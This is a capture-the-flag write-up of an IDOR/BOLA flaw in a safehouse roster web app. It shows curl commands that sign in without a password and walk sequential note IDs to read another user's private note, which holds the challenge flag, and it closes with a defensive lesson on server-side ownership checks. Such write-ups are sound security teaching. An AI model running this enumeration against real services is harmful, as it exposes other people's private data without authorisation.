# Larkspur House — IDOR on private notes (Black Hat India 2026 CTF)

**Flag:** `BlackHatIndia{n0t_y0ur_n0t3_n0t_y0ur_k3y_5a1f3h0u53_ad07f6c3}`

## Prompt (paraphrased)

A safehouse roster app ("Larkspur Roster") with daily check-ins, a bunk
board, supply requests, a notice board, and a private "My notes" page per
resident. The warden wrote the vault handover (including the release token)
in her own private notes before going on watch. Sign in with any callsign
and find it.

## Recon

- `GET /` is a static marketing page; the real app is behind `/signin`.
- `/static/app.js` shows the client only ever fetches `/api/notes` (list) and
  `/api/notes/{id}` (detail) — IDs are small sequential integers, no slug or
  UUID.
- Sign-in requires no password: `POST /api/signin {"callsign": "<anything>"}`
  sets a Flask-style signed session cookie (`roster_session`, base64 JSON +
  signature) storing just `{"cs": callsign, "sid": ...}`.

## Vulnerability: BOLA/IDOR on `GET /api/notes/{id}`

The notes feature is advertised in the UI as "private... kept with your
callsign," but the endpoint never checks that the requesting session's
callsign matches the note's author. Any signed-in session can read any
note by ID.

```bash
curl -s -X POST https://<host>/api/signin -H 'Content-Type: application/json' \
  -d '{"callsign":"Recon"}' -c cookies.txt

# own notes start at id 7/8 (freshly created); ids 1-6 already exist from other residents
for i in $(seq 1 10); do
  curl -s -b cookies.txt "https://<host>/api/notes/$i"
  echo
done
```

Note `#5`, authored by **Warden Reyes**, title "Vault handover (keep
private)":

```json
{
  "note": {
    "author": "Warden Reyes",
    "body": "Handing the lower vault to the night warden. Locker NNDPBP holds the spare radio and the med kit. Roster release token: BlackHatIndia{n0t_y0ur_n0t3_n0t_y0ur_k3y_5a1f3h0u53_ad07f6c3} . Do not leave this open on the common room terminal.",
    "id": 5,
    "title": "Vault handover (keep private)",
    "updated": "pinned"
  }
}
```

## Lesson

"Private" UI copy is not an access control — the server must check
ownership on every read, not just omit a note from list views for other
users. Sequential integer IDs with no ownership check on the detail
endpoint is the single most common BOLA pattern: always try incrementing
object IDs by hand once you're authenticated as any low-privilege account.
